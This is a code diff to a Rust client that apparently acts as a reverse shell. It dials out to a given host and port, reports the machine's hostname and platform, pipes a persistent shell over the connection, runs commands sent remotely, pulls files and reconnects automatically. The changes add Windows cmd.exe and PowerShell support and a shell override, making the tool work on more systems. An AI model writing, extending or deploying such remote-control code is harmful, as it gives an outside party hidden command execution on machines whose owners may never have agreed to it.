@@ -34,6 +34,132 @@ struct Args {
     poll_interval: f64,
     #[arg(short = 'n', long = "no-reconnect")]
     no_reconnect: bool,
+    /// Override the shell used for interactive mode and command execution.
+    /// Defaults to /bin/sh on Unix and %COMSPEC% (cmd.exe) on Windows.
+    #[arg(long)]
+    shell: Option<String>,
+}
+
+// ── Shell selection ────────────────────────────────────────────────────────
+
+/// The shell used for the persistent interactive session and for
+/// single-command execution (FRAME_CMD).
+struct Shell {
+    /// Program used for the persistent interactive shell.
+    interactive_prog: String,
+    /// Program + flag used to run a single command (`sh -c`, `cmd /C`, …).
+    exec_prog: String,
+    exec_flag: String,
+}
+
+impl Shell {
+    fn spawn_interactive(&self) -> std::io::Result<std::process::Child> {
+        Command::new(&self.interactive_prog)
+            .stdin(Stdio::piped())
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
+            .spawn()
+    }
+
+    fn spawn_cmd(&self, cmd: &str) -> std::io::Result<std::process::Child> {
+        Command::new(&self.exec_prog)
+            .arg(&self.exec_flag)
+            .arg(cmd)
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
+            .spawn()
+    }
+}
+
+fn resolve_shell(explicit: Option<&str>) -> Shell {
+    if let Some(prog) = explicit {
+        let exec_flag = infer_exec_flag(prog);
+        Shell {
+            interactive_prog: prog.to_string(),
+            exec_prog: prog.to_string(),
+            exec_flag,
+        }
+    } else {
+        default_shell()
+    }
+}
+
+#[cfg(windows)]
+fn default_shell() -> Shell {
+    let comspec = std::env::var("COMSPEC").unwrap_or_else(|_| "cmd.exe".to_string());
+    Shell {
+        interactive_prog: comspec.clone(),
+        exec_prog: comspec,
+        exec_flag: "/C".into(),
+    }
+}
+
+#[cfg(not(windows))]
+fn default_shell() -> Shell {
+    Shell {
+        interactive_prog: "/bin/sh".to_string(),
+        exec_prog: "/bin/sh".to_string(),
+        exec_flag: "-c".into(),
+    }
+}
+
+/// Guess the single-command flag for an explicitly provided shell program.
+fn infer_exec_flag(prog: &str) -> String {
+    let lower = prog.to_ascii_lowercase();
+    if lower.contains("cmd") {
+        "/C".into()
+    } else if lower.contains("powershell") || lower.contains("pwsh") {
+        "-Command".into()
+    } else {
+        "-c".into()
+    }
+}
+
+/// Write bytes to the interactive shell's stdin, translating LF→CRLF on
+/// Windows where cmd.exe expects carriage returns.
+fn write_shell_input(stdin: &mut impl Write, payload: &[u8]) -> std::io::Result<()> {
+    #[cfg(windows)]
+    {
+        let mut buf = Vec::with_capacity(payload.len() + 16);
+        for &b in payload {
+            if b == b'\n' && buf.last() != Some(&b'\r') {
+                buf.push(b'\r');
+            }
+            buf.push(b);
+        }
+        stdin.write_all(&buf)?;
+    }
+    #[cfg(not(windows))]
+    {
+        stdin.write_all(payload)?;
+    }
+    stdin.flush()
+}
+
+/// Normalize CRLF→LF for command output on Windows so `ww send` results
+/// match the Unix format.
+#[cfg(windows)]
+fn normalize_crlf(s: String) -> String {
+    s.replace("\r\n", "\n")
+}
+
+#[cfg(not(windows))]
+fn normalize_crlf(s: String) -> String {
+    s
+}
+
+/// Resolve a best-effort hostname: HOSTNAME → COMPUTERNAME → `hostname` cmd.
+fn detect_hostname() -> Option<String> {
+    let from_env = std::env::var("HOSTNAME")
+        .ok()
+        .or_else(|| std::env::var("COMPUTERNAME").ok());
+    if let Some(h) = from_env.filter(|s| !s.is_empty()) {
+        return Some(h);
+    }
+    Command::new("hostname").output().ok().and_then(|out| {
+        let s = String::from_utf8_lossy(&out.stdout).trim().to_string();
+        (!s.is_empty()).then_some(s)
+    })
 }
 
 // ── Frame I/O ───────────────────────────────────────────────────────────────
@@ -87,13 +213,13 @@ fn spawn_pipe_to_frames<R>(reader: R, writer: impl Write + Send + 'static) where
 
 // ── Session ─────────────────────────────────────────────────────────────────
 
-fn run_session(stream: &TcpStream) -> Result<()> {
+fn run_session(stream: &TcpStream, shell: &Shell) -> Result<()> {
     stream.set_read_timeout(None)?;
     let mut reader = stream.try_clone()?;
     let mut writer = stream.try_clone()?;
 
     // ── Handshake ────────────────────────────────────────────────
-    let hostname = std::env::var("HOSTNAME").ok().or_else(|| std::env::var("COMPUTERNAME").ok());
+    let hostname = detect_hostname();
     let platform = Some(format!("{}/{}", std::env::consts::OS, std::env::consts::ARCH));
     write_json_frame(&mut writer, FRAME_HANDSHAKE, &Handshake::new_client(hostname, platform))?;
 
@@ -104,12 +230,9 @@ fn run_session(stream: &TcpStream) -> Result<()> {
     eprintln!("[+] Connected. Session ID: {}", resp.session_id.as_deref().unwrap_or("?"));
 
     // ── Spawn persistent shell ───────────────────────────────────
-    let mut child = Command::new("/bin/sh")
-        .stdin(Stdio::piped())
-        .stdout(Stdio::piped())
-        .stderr(Stdio::piped())
-        .spawn()
-        .context("Failed to spawn /bin/sh")?;
+    let mut child = shell
+        .spawn_interactive()
+        .context("Failed to spawn interactive shell")?;
 
     let mut child_stdin = child.stdin.take().unwrap();
     let child_stdout = child.stdout.take().unwrap();
@@ -132,10 +255,7 @@ fn run_session(stream: &TcpStream) -> Result<()> {
         match ftype {
             FRAME_SHELL => {
                 // Write to shell stdin
-                if child_stdin.write_all(&payload).is_err() {
-                    break;
-                }
-                if child_stdin.flush().is_err() {
+                if write_shell_input(&mut child_stdin, &payload).is_err() {
                     break;
                 }
             }
@@ -179,12 +299,8 @@ fn run_session(stream: &TcpStream) -> Result<()> {
                     }
                 };
 
-                // Spawn sh -c for each command — stateless, bounded output, exit code captured.
-                let child = Command::new("sh")
-                    .args(["-c", &req.cmd])
-                    .stdout(Stdio::piped())
-                    .stderr(Stdio::piped())
-                    .spawn();
+                // Spawn a one-shot command — stateless, bounded output, exit code captured.
+                let child = shell.spawn_cmd(&req.cmd);
 
                 match child {
                     Ok(c) => {
@@ -198,8 +314,8 @@ fn run_session(stream: &TcpStream) -> Result<()> {
                         let result = CmdResult {
                             seq: req.seq,
                             exit_code: output.status.code().unwrap_or(-1),
-                            stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
-                            stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
+                            stdout: normalize_crlf(String::from_utf8_lossy(&output.stdout).into_owned()),
+                            stderr: normalize_crlf(String::from_utf8_lossy(&output.stderr).into_owned()),
                         };
                         let _ = write_json_frame(&mut writer, FRAME_CMD_RESULT, &result);
                     }
@@ -208,7 +324,7 @@ fn run_session(stream: &TcpStream) -> Result<()> {
                             seq: req.seq,
                             exit_code: -1,
                             stdout: String::new(),
-                            stderr: format!("Failed to spawn sh: {e}"),
+                            stderr: format!("Failed to spawn command shell: {e}"),
                         };
                         let _ = write_json_frame(&mut writer, FRAME_CMD_RESULT, &result);
                     }
@@ -323,12 +439,13 @@ fn handle_pull(writer: &mut TcpStream, path: &str) -> Result<()> {
 
 fn main() -> Result<()> {
     let args = Args::parse();
+    let shell = resolve_shell(args.shell.as_deref());
     let addr = format!("{}:{}", args.host, args.port);
     loop {
         eprintln!("[+] Connecting to {addr} ...");
         match TcpStream::connect(&addr) {
             Ok(stream) => {
-                if let Err(e) = run_session(&stream) {
+                if let Err(e) = run_session(&stream, &shell) {
                     eprintln!("[-] Session error: {e}");
                 }
             }
